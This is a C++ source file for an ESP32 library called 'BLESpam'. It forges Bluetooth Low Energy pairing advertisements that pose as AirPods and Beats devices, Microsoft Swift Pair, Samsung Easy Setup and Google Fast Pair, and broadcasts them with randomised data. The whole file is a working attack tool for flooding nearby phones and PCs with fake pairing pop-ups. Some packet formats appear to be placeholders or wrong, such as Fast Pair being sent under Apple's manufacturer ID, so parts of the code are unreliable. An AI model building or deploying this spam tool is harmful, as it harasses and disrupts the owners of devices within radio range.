/**
 * BLESpam Library Implementation
 * 
 * Platform-agnostic implementation with ESP32 support
 */

#include "BLESpam.h"

#if defined(ESP32)
#include <BLEDevice.h>
#include <BLEAdvertising.h>

static BLEAdvertising* pAdvertising = nullptr;
#endif

// Apple device data table
const AppleDeviceData appleDevices[] = {
    {AIRPODS_PRO, "0E20", "AirPods Pro"},
    {AIRPODS_MAX, "0A20", "AirPods Max"},
    {AIRPODS, "0220", "AirPods"},
    {AIRPODS_GEN2, "0F20", "AirPods 2nd Gen"},
    {AIRPODS_GEN3, "1320", "AirPods 3rd Gen"},
    {AIRPODS_PRO_GEN2, "1420", "AirPods Pro 2nd Gen"},
    {BEATS_FLEX, "1020", "Beats Flex"},
    {BEATS_SOLO3, "0620", "Beats Solo 3"},
    {POWERBEATS3, "0320", "Powerbeats 3"},
    {POWERBEATS_PRO, "0B20", "Powerbeats Pro"},
    {BEATS_SOLO_PRO, "0C20", "Beats Solo Pro"},
    {BEATS_STUDIO_BUDS, "1120", "Beats Studio Buds"},
    {BEATS_X, "0520", "Beats X"},
    {BEATS_STUDIO3, "0920", "Beats Studio 3"},
    {BEATS_STUDIO_PRO, "1720", "Beats Studio Pro"},
    {BEATS_FIT_PRO, "1220", "Beats Fit Pro"},
    {BEATS_STUDIO_BUDS_PLUS, "1620", "Beats Studio Buds+"}
};

const uint8_t appleDevicesCount = sizeof(appleDevices) / sizeof(AppleDeviceData);

BLESpam::BLESpam() {
    _initialized = false;
    _advertisingInterval = 100; // Default 100ms
    _txPower = 3; // Default 3 dBm
    _randomMac = true;
}

bool BLESpam::begin(const char* deviceName) {
#if defined(ESP32)
    BLEDevice::init(deviceName);
    pAdvertising = BLEDevice::getAdvertising();
    _initialized = true;
    return true;
#else
    // Placeholder for other platforms
    return false;
#endif
}

void BLESpam::stop() {
#if defined(ESP32)
    if (pAdvertising != nullptr) {
        pAdvertising->stop();
    }
#endif
}

uint8_t BLESpam::getRandomByte() {
    return (uint8_t)random(0, 256);
}

void BLESpam::setAdvertisingInterval(uint16_t intervalMs) {
    _advertisingInterval = intervalMs;
}

void BLESpam::setTxPower(int8_t powerDbm) {
    _txPower = powerDbm;
#if defined(ESP32)
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)powerDbm);
#endif
}

void BLESpam::setRandomMac(bool enable) {
    _randomMac = enable;
}

void BLESpam::_generateAppleNewDeviceData(AppleDeviceType deviceType, uint8_t* data, uint8_t* dataLen) {
    // Find device in table
    const char* deviceCode = "0220"; // Default to AirPods
    for (uint8_t i = 0; i < appleDevicesCount; i++) {
        if (appleDevices[i].type == deviceType) {
            deviceCode = appleDevices[i].hexCode;
            break;
        }
    }
    
    // Build Apple Continuity "New Device" packet
    uint8_t idx = 0;
    
    // Continuity type: 0x07 (ProximityPair)
    data[idx++] = 0x07;
    
    // Payload size: 0x19 (25 bytes)
    data[idx++] = 0x19;
    
    // Prefix: 0x07 (NEW DEVICE)
    data[idx++] = 0x07;
    
    // Device model (2 bytes) - convert hex string to bytes
    uint8_t byte1 = 0, byte2 = 0;
    if (deviceCode[0] >= '0' && deviceCode[0] <= '9') byte1 = (deviceCode[0] - '0') << 4;
    else if (deviceCode[0] >= 'A' && deviceCode[0] <= 'F') byte1 = (deviceCode[0] - 'A' + 10) << 4;
    if (deviceCode[1] >= '0' && deviceCode[1] <= '9') byte1 |= (deviceCode[1] - '0');
    else if (deviceCode[1] >= 'A' && deviceCode[1] <= 'F') byte1 |= (deviceCode[1] - 'A' + 10);
    
    if (deviceCode[2] >= '0' && deviceCode[2] <= '9') byte2 = (deviceCode[2] - '0') << 4;
    else if (deviceCode[2] >= 'A' && deviceCode[2] <= 'F') byte2 = (deviceCode[2] - 'A' + 10) << 4;
    if (deviceCode[3] >= '0' && deviceCode[3] <= '9') byte2 |= (deviceCode[3] - '0');
    else if (deviceCode[3] >= 'A' && deviceCode[3] <= 'F') byte2 |= (deviceCode[3] - 'A' + 10);
    
    data[idx++] = byte1;
    data[idx++] = byte2;
    
    // Status
    data[idx++] = 0x55;
    
    // Buds battery level (random)
    data[idx++] = ((random(0, 10) << 4) | random(0, 10));
    
    // Charging case battery level (random)
    data[idx++] = ((random(0, 8) << 4) | random(0, 10));
    
    // Lid open counter (random)
    data[idx++] = getRandomByte();
    
    // Color
    data[idx++] = 0x00;
    
    // Padding
    data[idx++] = 0x00;
    
    // 16 random bytes
    for (uint8_t i = 0; i < 16; i++) {
        data[idx++] = getRandomByte();
    }
    
    *dataLen = idx;
}

void BLESpam::_generateSwiftPairData(uint8_t* data, uint8_t* dataLen) {
    // Microsoft Swift Pair packet
    uint8_t idx = 0;
    
    // Swift Pair header
    data[idx++] = 0x03;
    data[idx++] = 0x00;
    data[idx++] = 0x80;
    
    // Device name (simple example)
    const char* deviceName = "Device";
    for (uint8_t i = 0; i < strlen(deviceName); i++) {
        data[idx++] = deviceName[i];
    }
    
    *dataLen = idx;
}

void BLESpam::_generateSamsungData(const char* model, uint8_t* data, uint8_t* dataLen) {
    // Samsung Easy Setup packet structure
    uint8_t idx = 0;
    
    // Samsung header (example structure)
    data[idx++] = 0x01;
    data[idx++] = 0x00;
    data[idx++] = 0x02;
    
    // Model identifier
    if (strcmp(model, "Buds") == 0) {
        data[idx++] = 0x01;
    } else if (strcmp(model, "Watch") == 0) {
        data[idx++] = 0x02;
    } else {
        data[idx++] = 0x00;
    }
    
    // Random data
    for (uint8_t i = 0; i < 4; i++) {
        data[idx++] = getRandomByte();
    }
    
    *dataLen = idx;
}

void BLESpam::_generateFastPairData(const char* modelId, uint8_t* data, uint8_t* dataLen) {
    // Fast Pair packet - just the model ID
    uint8_t idx = 0;
    
    // Convert hex string to bytes (6 characters = 3 bytes)
    for (uint8_t i = 0; i < 6; i += 2) {
        uint8_t byte = 0;
        if (modelId[i] >= '0' && modelId[i] <= '9') byte = (modelId[i] - '0') << 4;
        else if (modelId[i] >= 'A' && modelId[i] <= 'F') byte = (modelId[i] - 'A' + 10) << 4;
        else if (modelId[i] >= 'a' && modelId[i] <= 'f') byte = (modelId[i] - 'a' + 10) << 4;
        
        if (modelId[i+1] >= '0' && modelId[i+1] <= '9') byte |= (modelId[i+1] - '0');
        else if (modelId[i+1] >= 'A' && modelId[i+1] <= 'F') byte |= (modelId[i+1] - 'A' + 10);
        else if (modelId[i+1] >= 'a' && modelId[i+1] <= 'f') byte |= (modelId[i+1] - 'a' + 10);
        
        data[idx++] = byte;
    }
    
    *dataLen = idx;
}

bool BLESpam::_startAdvertising(uint16_t manufacturerId, const uint8_t* data, uint8_t dataLen) {
#if defined(ESP32)
    if (!_initialized || pAdvertising == nullptr) {
        return false;
    }
    
    // Stop any current advertising
    pAdvertising->stop();
    
    // Create advertisement data
    BLEAdvertisementData advertisementData;
    advertisementData.setFlags(0x06); // BR_EDR_NOT_SUPPORTED | GENERAL_DISC_MODE
    
    // Add manufacturer data
    std::string mfgData;
    mfgData += (char)(manufacturerId & 0xFF);
    mfgData += (char)((manufacturerId >> 8) & 0xFF);
    for (uint8_t i = 0; i < dataLen; i++) {
        mfgData += (char)data[i];
    }
    advertisementData.setManufacturerData(mfgData);
    
    pAdvertising->setAdvertisementData(advertisementData);
    
    // Set advertising parameters
    pAdvertising->setMinInterval(_advertisingInterval * 1.6); // Convert ms to 0.625ms units
    pAdvertising->setMaxInterval(_advertisingInterval * 1.6);
    
    // Start advertising
    pAdvertising->start();
    
    return true;
#else
    return false;
#endif
}

void BLESpam::_stopAdvertising() {
#if defined(ESP32)
    if (pAdvertising != nullptr) {
        pAdvertising->stop();
    }
#endif
}

void BLESpam::advertiseAppleDevice(AppleDeviceType deviceType) {
    uint8_t data[MAX_BLE_ADVERTISEMENT_SIZE];
    uint8_t dataLen = 0;
    
    _generateAppleNewDeviceData(deviceType, data, &dataLen);
    _startAdvertising(MANUFACTURER_ID_APPLE, data, dataLen);
}

void BLESpam::advertiseAppleContinuity(AppleContinuityType continuityType, const uint8_t* data, uint8_t dataLen) {
    _startAdvertising(MANUFACTURER_ID_APPLE, data, dataLen);
}

void BLESpam::advertiseWindowsSwiftPair() {
    uint8_t data[MAX_BLE_ADVERTISEMENT_SIZE];
    uint8_t dataLen = 0;
    
    _generateSwiftPairData(data, &dataLen);
    _startAdvertising(MANUFACTURER_ID_MICROSOFT, data, dataLen);
}

void BLESpam::advertiseSamsungEasySetup(const char* model) {
    uint8_t data[MAX_BLE_ADVERTISEMENT_SIZE];
    uint8_t dataLen = 0;
    
    _generateSamsungData(model, data, &dataLen);
    _startAdvertising(MANUFACTURER_ID_SAMSUNG, data, dataLen);
}

void BLESpam::advertiseFastPair(const char* modelId) {
    uint8_t data[MAX_BLE_ADVERTISEMENT_SIZE];
    uint8_t dataLen = 0;
    
    _generateFastPairData(modelId, data, &dataLen);
    _startAdvertising(MANUFACTURER_ID_APPLE, data, dataLen);
}
